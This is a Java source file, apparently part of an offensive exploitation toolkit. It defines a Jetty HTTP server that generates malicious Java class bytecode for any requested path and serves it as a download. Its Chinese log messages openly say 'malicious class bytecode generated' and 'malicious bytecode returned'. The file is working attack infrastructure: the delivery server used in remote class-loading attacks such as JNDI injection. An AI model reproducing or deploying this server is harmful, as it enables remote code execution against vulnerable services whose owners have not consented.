package top.racerz.server;

import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.servlet.ServletHandler;
import top.racerz.frame.ASMGenerate;
import top.racerz.utils.Logger;

import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.URLEncoder;

public class JettyServer implements Runnable {

    private Server server;

    public JettyServer(int port) {
        server = new Server(port);
    }

    @Override
    public void run() {
        ServletHandler handler = new ServletHandler();
        // This handler then needs to be registered with the Server object
        server.setHandler(handler);

        // This is a raw Servlet, not a Servlet that has been configured
        handler.addServletWithMapping(GenerateServlet.class, "/*");

        // Start things up!
        try {
            server.start();
            // The use of server.join() the will make the current thread join and
            // wait until the server thread is done executing.
            server.join();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static class GenerateServlet extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

            String fileName = request.getRequestURI().substring(1);

            ByteArrayInputStream inputStream = null;

            try {
                byte[] evilByteCode = ASMGenerate.run(fileName);
                Logger.warning(" Jetty 服务器 >> 恶意类字节码生成成功");
                inputStream = new ByteArrayInputStream(evilByteCode);
            } catch (Exception e) {
                e.printStackTrace();
                Logger.error(" Jetty 服务器 >> 恶意类字节码生成失败");
            }

            Logger.info(" Jetty 服务器 >> 接收访问：" + request.getRequestURL());
            response.setStatus(HttpServletResponse.SC_OK);
            response.setHeader("content-disposition", "attachment;filename=" + URLEncoder.encode(fileName, "UTF-8"));

            int len;
            byte[] buffer = new byte[1024];
            ServletOutputStream out = response.getOutputStream();
            if (inputStream != null) {
                while ((len = inputStream.read(buffer)) > 0) {
                    out.write(buffer, 0, len);
                }
                out.close();
                Logger.info(" Jetty 服务器 >> 成功返回恶意字节码");
            } else {
                Logger.info(" Jetty 服务器 >> 读取文件失败");
            }

        }

        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            super.doGet(req, resp);
        }
    }
 }
